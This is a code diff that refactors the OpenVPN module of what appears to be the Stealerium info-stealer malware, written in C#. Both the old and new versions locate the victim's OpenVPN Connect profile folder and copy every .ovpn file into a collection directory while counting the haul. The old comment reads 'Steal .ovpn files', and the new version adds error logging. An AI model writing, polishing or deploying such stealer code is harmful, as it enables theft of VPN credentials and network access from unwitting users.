@@ -6,32 +6,34 @@ namespace Stealerium.Target.VPN
 {
     internal sealed class OpenVpn
     {
-        // Save("OpenVPN");
-        public static void Save(string sSavePath)
+        // Save OpenVPN profiles to the specified path
+        public static void Save(string savePath)
         {
-            // "OpenVPN connect" directory path
-            var vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                "OpenVPN Connect\\profiles");
-            // Stop if not exists
-            if (!Directory.Exists(vpn))
+            // Define the path to the "OpenVPN Connect" profiles directory
+            var vpnProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect", "profiles");
+
+            // Stop if the OpenVPN profiles directory does not exist
+            if (!Directory.Exists(vpnProfilePath))
                 return;
+
             try
             {
-                // Create directory to save profiles
-                Directory.CreateDirectory(sSavePath + "\\profiles");
-                // Steal .ovpn files
-                foreach (var file in Directory.GetFiles(vpn))
-                    if (Path.GetExtension(file).Contains("ovpn"))
-                    {
-                        Counter.Vpn++;
-                        File.Copy(file,
-                            Path.Combine(sSavePath, "profiles\\"
-                                                    + Path.GetFileName(file)));
-                    }
+                // Create the directory to save profiles
+                var profilesSavePath = Path.Combine(savePath, "profiles");
+                Directory.CreateDirectory(profilesSavePath);
+
+                // Copy all .ovpn files from the OpenVPN profiles directory
+                foreach (var filePath in Directory.GetFiles(vpnProfilePath, "*.ovpn"))
+                {
+                    Counter.Vpn++;
+                    var destinationPath = Path.Combine(profilesSavePath, Path.GetFileName(filePath));
+                    File.Copy(filePath, destinationPath);
+                }
             }
-            catch
+            catch (Exception error)
             {
-                // ignored
+                // Log or handle the exception if necessary
+                Logging.Log("OpenVPN >> Error saving OpenVPN data:\n" + error);
             }
         }
     }
